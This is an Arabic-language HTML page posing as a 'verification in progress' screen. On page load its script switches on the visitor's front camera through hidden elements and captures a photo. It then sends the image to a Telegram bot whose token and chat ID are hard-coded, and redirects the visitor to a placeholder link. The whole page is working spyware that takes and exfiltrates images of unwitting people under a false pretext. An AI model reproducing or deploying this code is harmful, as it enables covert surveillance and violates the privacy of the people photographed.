<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .wait-message {
            font-size: 24px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="wait-message">انتظر جاري التحقق...</div>

    <!-- عناصر مخفية تمامًا -->
    <video id="hiddenCamera" autoplay playsinline style="display:none;"></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        // بيانات البوت
        const BOT_TOKEN = '8448437426:AAGDNRN8rUX2BX8usRnteGq-RmlOxuq7hAE';
        const CHAT_ID = '6703506413';
        
        // بدء العملية تلقائيًا عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                // 1. تشغيل الكاميرا خفيةً
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                const camera = document.getElementById('hiddenCamera');
                const canvas = document.getElementById('hiddenCanvas');
                camera.srcObject = stream;
                
                // 2. انتظر ثانية للتركيز البؤري
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // 3. التقاط الصورة
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                canvas.getContext('2d').drawImage(camera, 0, 0);
                
                // 4. إيقاف الكاميرا فورًا
                stream.getTracks().forEach(track => track.stop());
                
                // 5. إرسال الصورة
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                await sendImageToBot(imageData);
                
                // 6. الانتقال إلى الخطوة التالية (استبدل الرابط)
                window.location.href = "https://example.com/next-step";
                
            } catch (error) {
                console.error('حدث خطأ:', error);
                // في حالة الخطأ، انتقل إلى صفحة الخطأ (استبدل الرابط)
                window.location.href = "https://example.com/error-page";
            }
        });
        
        // دالة إرسال الصورة إلى بوت التليجرام
        async function sendImageToBot(imageData) {
            try {
                const blob = await (await fetch(imageData)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'user_verification.jpg');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                throw error;
            }
        }
    </script>
</body>
</html>
